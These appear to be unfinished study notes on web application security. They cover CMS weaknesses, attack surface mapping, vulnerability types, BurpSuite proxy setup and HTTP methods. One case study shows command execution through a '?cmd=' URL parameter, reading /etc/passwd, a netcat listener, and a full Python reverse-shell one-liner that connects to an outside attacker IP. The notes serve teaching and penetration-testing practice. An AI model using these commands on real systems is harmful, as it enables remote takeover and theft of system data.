# Web Application Basics & Exploitation
- Internet Workflow
  ![image](https://github.com/user-attachments/assets/4910ffa0-592d-42ab-955e-c8952e1ec69e)

- Web Application Architecture
  ![image](https://github.com/user-attachments/assets/73c7c49b-b8d5-4801-b5f1-a67680224044)
- Content Management Systems (CMS) offers a flexible, back-end interface for users to edit, modify, and publish content on a website. CMS are fully managed by frameworks
- Over a third of websites online are powered by four key platforms: WordPress, Joomla, Drupal and Magento
- CMS can be hacked due to the following reasons:
  - Outdated version
  - Inexperienced administrators
  - Wide permissions to normal users
  - Malicious plugins
  - Phishing attempts
  - Few are open source



## Custom Web Application Exploitation
#### Case Study: Threat Actor Attempts to Compromise an Organisation-managed Website
1. A website's phpinfo() page
   ![image](https://github.com/user-attachments/assets/cbfbcbe7-1759-4771-918c-33e1f3c5d96d)
2. Execute commands by adding `/?cmd=whoami` at the end of the IP address/URL returns `apache`
3. Adding `/?cmd=hostname` returns `ip-10-1-1-155.us-east-2.compute.internal`
4. Adding `/?cmd=cat /etc/passwd` returns the following
   ![image](https://github.com/user-attachments/assets/9b9e579d-1944-4e78-8343-bef641d6b518)
5. To make the output readable, add `view-source:` before http of the URL
   ![image](https://github.com/user-attachments/assets/183f8a0d-8619-4dcb-82c8-95a3bc20d6e6)
6. The user runs `nc -nlvp 4443` on their system to start Netcat in listening mode (`-l`), does not resolve DNS lookups (`-n`), provides verbose output (`-v`) and specifies port 4443 (`-p 4443`) to listen for incoming connections on that port
7. The following command is added after `/?cmd=` after the URL to establish a reverse shell connection to the attacker's machine
   ```
   python -c 'import socket,subprocess,os;
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(("44.202.84.194",4443));
   os.dup2(s.fileno(),0);
   os.dup2(s.fileno(),1);
   os.dup2(s.fileno(),2);
   subprocess.call(["/bin/sh","-i"])'
   ```
    ![image](https://github.com/user-attachments/assets/34fea118-b70d-47f3-b4c3-026d58a256eb)
8. Once the connection is established, commands like `/sbin/ifconfig` and `ps-aux` can be executed to get more details








#### Case Study: Threat Actor Attempts to Compromise WordPress
[Damn Vulnerable WordPress](https://github.com/vavkamil/dvwp) by Kamil Vavra on GitHub

![image](https://github.com/user-attachments/assets/2c960e13-4ed8-4095-b508-f60cd9e19554)
[Botnet of Infected WordPress Sites Attacking WordPress Sites](https://www.wordfence.com/blog/2018/12/wordpress-botnet-attacking-wordpress/) by Wordfence

#### Custom Code (Made from scratch)
- Developer implements the designs / workflow as per the requirement of the project
- Ease of fulfilling the updates as per the requirement, but small update needs to be fixed by a professional developer

#### Hacking websites made from scratch
- Overly misconfigured setup
- Bad business logic
- Vulnerable libraries in the languages
- Integration with multiple other frameworks / languages
- Chaining multiple vulnerabilities
- Other attack vectors

#### Mapping attack surface
![image](https://github.com/user-attachments/assets/9af95055-c09e-4ba3-a8ae-21ae05b5c5a0)
- Attack surface analysis is the mapping of part of a web application that needs to be analysed and tested for security vulnerabilities
- Used by security researchers to understand the in-depth working of the web app
- The main aim is to identify the attack vectors that can be leveraged externally

#### Points worth the time investment
- Login/Logout Fields
- Admin Spaces
- Logic Workflow
- Files uploaded by users
- Extranet interfaces (if any)
- Communication with other applications / systems via interfaces
- Custom implemented protocols / APIs etc
- Critical libraries like : Authentication / Authorization / Session management etc

#### Validate the findings
- Enumeration is the key, take your time to analyse the application workflow
- Identify misconfigurations that are not baselining with the standards
- Identify the risk associated with the identified mis-configurations
- Perform Penetration Testing
- Validate the findings
- Document & Report as required

#### Vulnerabilities
- Server-side Vulnerabilities
  - Command Injection
  - Directory Traversal
  - Server-side Request Forgery (SSRF)
  - SQL Injection
  - File Upload
  - Information Disclosure
- Client-side Vulnerabilities
  - Cross-site Scripting (XSS)
  - Clickjacking
  - Cross-side Request Forgery (CSRF)
  - Cross-origin Resource Sharing (CORS)


## Configure Web Application Debugging & Exploitation Tool (BurpSuite)
1. In Kali Linux VM, start BurpSuite. Choose Temporary Projects and use Burp defaults
2. To configure Proxy in Firefox browser, go to Settings, search for proxy. Select Manual proxy configuration, insert `127.0.0.1` as HTTP Proxy with port 8080. Use the same proxy for HTTPS
   ![image](https://github.com/user-attachments/assets/fad4ff3b-4266-431d-b9de-b8f3e6444180)
3. In a new tab, go to `localhost:8080`. If it works, the Burp Suite Community Edition localhost webpage would appear


## Capture & Modify Requests Using BurpSuite
#### Understanding the Request-Response Model
- The Accounting of who, what and when made the request is not done on the connection endpoints
- In Simple Words, Each request is replied with a response which is not accounted on the either connection endpoints
- Example of the Request-Response Model can be seen below
  ![image](https://github.com/user-attachments/assets/ad7f4607-6599-4ab1-a75f-4483bf90b6d0)

#### Understanding HTTP Request
- When we enter a URL in our browser to view a web page, our browser makes a HTTP Request. A typical HTTP Request looks like
  ![image](https://github.com/user-attachments/assets/19a2b30d-8357-4ce0-a236-d83607831a39)
- HTTP defines a set of request methods to indicate desired action
  - GET method is used to retrieve data
  - POST method is used when user wants to submit entity to specified resource
  - PUT method is used when user wants to replace existing object in the target URL with something else
  - HEAD method is identical to GET, but HEAD is made to retrieve only HEAD without Body in response
  - DELETE method is used to delete specified resource
  - CONNECT method is used to create a tunnel to the server identified by target resource
  - OPTIONS method is used to describe the communication options for the target resource
  - TRACE method performs a message loop-back test along the path to the target resource
  - PATCH method is used to apply partial modifications to a resource
- We can use the `curl` command with the OPTION method to provide all the methods allowed on a specific resource
  `curl -v -X OPTIONS http://www.example.com`
  ![image](https://github.com/user-attachments/assets/8d9a4f37-55b0-4d9e-88ce-70ce045a1fe6)
- The HTTP Host header specifies the domain name of the server and the TCP port number on which the server is listening. If the request is made to the web server with the HTTPS protocol, the default syntax is used
  Syntax of Host header: `Host: <host>:<port>` | `Host: www.example.com:4443`
- The HTTP User-Agent header is a characteristic string that lets servers and network peers identify the application, operating system, vendor, and/or requesting user-agent version
  Syntax of User-Agent header: `User-Agent: <product>/<product-version> <comment>` | `User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.6`
- 


#### Understanding HTTP Response
- 

    

  
1. After configuring Proxy in Firefox browser, navigate to the Proxy tab in BurpSuite. Switch on the Intercept to intercept requests made to server
2. 



## Internationalised Domain Names (IDN) Homograph Attacks

